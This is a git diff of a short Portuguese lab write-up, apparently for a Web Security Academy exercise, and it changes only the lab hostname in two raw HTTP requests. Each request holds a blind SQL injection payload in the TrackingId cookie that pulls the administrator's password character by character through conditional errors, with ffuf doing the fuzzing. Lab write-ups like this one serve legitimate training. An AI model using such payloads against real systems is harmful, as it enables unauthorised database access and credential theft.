@@ -27,7 +27,7 @@ fiz posição por posição até posição 21 retornar falso.
 req.txt
 ```bash
 GET / HTTP/1.1
-Host: 0a4a006a047060c781465c11004a0050.web-security-academy.net
+Host: 0ad5004903bbf45b838d6ecf00120090.web-security-academy.net
 Cookie: TrackingId=XOqI8SzaKowydEzs'||(SELECT CASE WHEN (SUBSTR(password, 1, 1) = 'FUZZ') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator')||'; session=eYt28e3KeMSlCvzIeu3m4mkqxuapQagh
 ```
 
@@ -42,7 +42,7 @@ ffuf -w /home/luweed/Documents/testefuz.txt:FUZZ \
 ultima req.txt (retornou falso)
 ```bash
 GET / HTTP/1.1
-Host: 0a4a006a047060c781465c11004a0050.web-security-academy.net
+Host: 0ad5004903bbf45b838d6ecf00120090.web-security-academy.net
 Cookie: TrackingId=XOqI8SzaKowydEzs'||(SELECT CASE WHEN (SUBSTR(password, 21, 1) = 'FUZZ') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator')||'; session=eYt28e3KeMSlCvzIeu3m4mkqxuapQagh
 ```
 
